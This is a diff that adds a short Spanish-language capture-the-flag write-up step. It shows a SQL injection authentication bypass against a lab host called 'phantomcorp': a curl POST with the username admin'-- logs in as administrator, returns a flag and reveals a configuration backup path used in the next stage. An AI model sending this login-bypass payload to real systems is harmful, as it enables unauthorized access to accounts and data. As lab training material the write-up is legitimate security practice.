@@ -1,0 +1,10 @@
+# R2 — Explotación — SQL Injection con bypass de autenticación en /portal/login
+# El usuario `admin'--` comenta la verificación de contraseña y autentica como administrador.
+
+$ curl -s -X POST http://phantomcorp/portal/login --data "user=admin'--&pass=x"
+Bienvenido admin. Dashboard RRHH.
+FLAG{final_sqli_foothold}
+Backup de config disponible en: /backup/rrhh.conf
+
+# Acceso al dashboard de admin sin credenciales válidas: FLAG{final_sqli_foothold}
+# El dashboard revela la ruta al backup de configuración (habilita R3).
